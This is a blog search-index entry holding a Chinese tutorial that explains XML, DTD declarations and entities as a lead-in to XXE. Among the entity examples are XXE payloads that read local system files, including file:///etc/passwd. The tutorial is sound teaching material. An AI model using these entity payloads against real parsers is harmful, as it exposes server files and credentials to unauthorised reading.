<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/12/04/XXE/"/>
    <url>/2021/12/04/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）， 被设计用来传输和存储数据。区别于用来显示数据的html</p><p>作用： 当作小型的数据库使用，如msg聊天工作通过xml文件在本地保留聊天记录，软件的配置文件xmk，通讯软件通过xml文件保留用户之前看到的媒体信息，在网站当中当作 “接口” 服务，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文 件（SVG header）应用比较广泛。</p><p>实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Math<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>me<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>vendor<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>pass the exam!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第一行是XML声明(可选)，定义了XML的版本以及使用的编码，note是文档的根元素<code>&lt;note&gt;</code>(说明本文档是一个便笺)</p><p>子元素：<code>&lt;to&gt; &lt;from&gt; &lt;heading&gt; &lt;body&gt;</code></p><blockquote><p> 注意：XML标签对大小写敏感，属性值须加引号</p></blockquote><p>单独的XML文档不会被浏览器解析，直接被当作文本输出</p><p>可以配合CSS格式化XML输出</p><blockquote><p>&lt;?xml-stylesheet type=”text/css” href=”cd_catalog.css”?&gt;</p></blockquote><p>但更常用的是使用XSLT转换XML文档用以HTML格式显示</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211205150958245.png"></p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="DTD基本概念"><a href="#DTD基本概念" class="headerlink" title="DTD基本概念"></a>DTD基本概念</h2><p> XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br> DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">category</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">element-content</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素通过类别关键词EMPTY进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">br</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="只有-PCDATA-的元素"><a href="#只有-PCDATA-的元素" class="headerlink" title="只有 PCDATA 的元素"></a>只有 PCDATA 的元素</h3><p>只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明：</p><p> 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>)&gt;</span><br></code></pre></td></tr></table></figure><p> 或</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>,<span class="hljs-meta-keyword">child2</span>,...)&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>当子元素按照由逗号分隔开的序列进行声明时，这些子元素必须按照相同的顺序出现在文档中。在一个完整的声明中，子元素也必须被声明，同时子元素也可拥有子元素。”note” 元素的完整声明是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span>      (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="声明只出现一次的元素"><a href="#声明只出现一次的元素" class="headerlink" title="声明只出现一次的元素"></a>声明只出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>)&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：message 子元素必须出现一次，并且必须只在 “note” 元素中出现一次。</p><h3 id="声明最少出现一次的元素"><a href="#声明最少出现一次的元素" class="headerlink" title="声明最少出现一次的元素"></a>声明最少出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的加号（+）声明了：message 子元素必须在 “note” 元素内出现至少一次。</p><h3 id="声明出现零次或多次的元素"><a href="#声明出现零次或多次的元素" class="headerlink" title="声明出现零次或多次的元素"></a>声明出现零次或多次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的星号（*）声明了：子元素 message 可在 “note” 元素内出现零次或多次。</p><h3 id="声明出现零次或一次的元素"><a href="#声明出现零次或一次的元素" class="headerlink" title="声明出现零次或一次的元素"></a>声明出现零次或一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p> 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的问号(?)声明了：子元素 message 可在 “note” 元素内出现零次或一次。</p><h3 id="声明”非…-即…”类型的内容"><a href="#声明”非…-即…”类型的内容" class="headerlink" title="声明”非…/即…”类型的内容"></a>声明”非…/即…”类型的内容</h3><p>实例:</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">header</span>,(<span class="hljs-meta-keyword">message</span>|<span class="hljs-meta-keyword">body</span>))&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素必须包含 “to” 元素、”from” 元素、”header” 元素，以及非 “message” 元素即 “body” 元素。</p><h3 id="声明混合型的内容"><a href="#声明混合型的内容" class="headerlink" title="声明混合型的内容"></a>声明混合型的内容</h3><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">#PCDATA</span>|<span class="hljs-meta-keyword">to</span>|<span class="hljs-meta-keyword">from</span>|<span class="hljs-meta-keyword">header</span>|<span class="hljs-meta-keyword">message</span>)*&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素可包含出现零次或多次的 PCDATA、”to”、”from”、”header” 或者 “message”。</p><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></code></pre></td></tr></table></figure><p>DTD实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">payment</span> <span class="hljs-meta-keyword">Luckey</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;Q&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><h3 id="引用方式"><a href="#引用方式" class="headerlink" title="引用方式"></a>引用方式</h3><p> XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code><br> 实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行</p><ul><li><p><input checked="" disabled="" type="checkbox">  外部引用</p></li><li><p>网络上DTD文件</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部DTD文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///var/www/html/XML.dtd&quot;</span> &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p><strong>PCDATA</strong><br> PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br> 被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;amp</code> <code>&amp;lt</code> <code>&amp;gt</code>实体来分别替换。<br> <strong>CDATA</strong><br> CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><ul><li><input checked="" disabled="" type="checkbox"> 内部引用</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [body]&gt;</span><br></code></pre></td></tr></table></figure><p>即DTD在XML文件内，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p><strong>实体使用方式</strong>：分为内部声明实体和引用外部实体</p><ul><li><input checked="" disabled="" type="checkbox"> 内部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD在XML文档中</p><ul><li><input checked="" disabled="" type="checkbox"> 外部实体</li></ul><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><p>通过引用<code>公用DTD</code></p><ul><li>网络上DTD文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部DTD文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><ul><li>网络上的外部DTD文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部DTD文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>下面是XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span 